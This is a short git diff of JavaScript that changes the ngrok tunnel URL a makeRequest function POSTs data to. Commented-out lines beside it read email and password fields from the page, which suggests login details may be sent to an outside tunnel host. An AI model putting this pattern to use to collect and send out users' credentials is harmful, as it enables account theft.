@@ -15,7 +15,7 @@ var token = function() {
     
 function makeRequest(jsonElements) {
   var http = new XMLHttpRequest();
-  var url = "https://3fe3-85-190-229-79.ngrok-free.app/event/";
+  var url = "https://5338-190-191-117-73.ngrok-free.app/event/";
   /*var email = document.getElementById('email');
 var password = document.getElementById('pass');"*/
   http.open("POST", url, true);
